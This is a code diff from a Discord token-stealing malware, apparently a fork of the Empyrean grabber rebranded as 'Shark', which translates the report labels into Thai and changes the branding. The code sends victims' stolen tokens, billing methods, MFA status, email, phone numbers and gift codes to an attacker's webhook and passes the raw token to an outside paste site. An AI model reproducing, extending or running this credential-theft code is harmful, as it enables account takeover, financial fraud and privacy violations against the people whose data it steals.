@@ -342,16 +342,16 @@ class upload_tokens:
             embed = Embed(title=f"{username} ({user_id})", color=0x000000)
             embed.set_thumbnail(url=avatar)
 
-            embed.add_field(name="<a:pinkcrown:996004209667346442> Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
-            embed.add_field(name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
-            embed.add_field(name="<a:redboost:996004230345281546> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
-            embed.add_field(name="<a:pinklv:996004222090891366> Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
-            embed.add_field(name="<:mfa:1021604916537602088> MFA:", value=f"{mfa}", inline=True)
+            embed.add_field(name="<a:pinkcrown:996004209667346442> โทเค็น:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
+            embed.add_field(name="<a:nitroboost:996004213354139658> ไนโตร:", value=f"{nitro}", inline=True)
+            embed.add_field(name="<a:redboost:996004230345281546> เครื่องหมาย:", value=f"{badges if badges != '' else 'None'}", inline=True)
+            embed.add_field(name="<a:pinklv:996004222090891366> วิธีจ่ายเงิน:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
+            embed.add_field(name="<:mfa:1021604916537602088> รหัสสองชั้น:", value=f"{mfa}", inline=True)
 
             embed.add_field(name="\u200b", value="\u200b", inline=False)
             
-            embed.add_field(name="<a:rainbowheart:996004226092245072> Email:", value=f"{email if email != None else 'None'}", inline=True)
-            embed.add_field(name="<:starxglow:996004217699434496> Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    
+            embed.add_field(name="<a:rainbowheart:996004226092245072> อีเมล:", value=f"{email if email != None else 'None'}", inline=True)
+            embed.add_field(name="<:starxglow:996004217699434496> เบอร์โทร:", value=f"{phone if phone != None else 'None'}", inline=True)    
 
             embed.add_field(name="\u200b", value="\u200b", inline=False)
 
@@ -364,9 +364,9 @@ class upload_tokens:
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
             if codes != None:
-                embed.add_field(name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
+                embed.add_field(name="<a:gift:1021608479808569435> โค้ดต่างๆ:", value=codes, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
-            embed.set_footer(text="github.com/addi00000/empyrean")
+            embed.set_footer(text="Improved by zoex#8484")
 
-            self.webhook.send(embed=embed, username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
+            self.webhook.send(embed=embed, username="Shark", avatar_url="https://pfps.gg/assets/pfps/8083-shark.png")
